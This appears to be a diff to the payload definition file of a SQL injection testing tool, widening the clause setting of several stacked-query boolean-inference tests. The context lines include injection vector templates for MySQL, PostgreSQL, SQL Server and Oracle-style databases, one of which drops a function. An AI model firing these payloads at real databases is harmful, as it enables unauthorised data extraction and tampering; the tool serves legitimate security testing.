@@ -1386,7 +1386,7 @@ Tag: <test>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
         <request>
@@ -1407,7 +1407,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
         <request>
@@ -1428,7 +1428,7 @@ Tag: <test>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</vector>
         <request>
@@ -1449,7 +1449,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1</vector>
         <request>
@@ -1469,7 +1469,7 @@ Tag: <test>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</vector>
         <request>
@@ -1491,7 +1491,7 @@ Tag: <test>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</vector>
         <request>
@@ -1513,7 +1513,7 @@ Tag: <test>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL</vector>
         <request>
@@ -1533,7 +1533,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;IIF([INFERENCE],1,1/0)</vector>
         <request>
@@ -1553,7 +1553,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END</vector>
         <request>
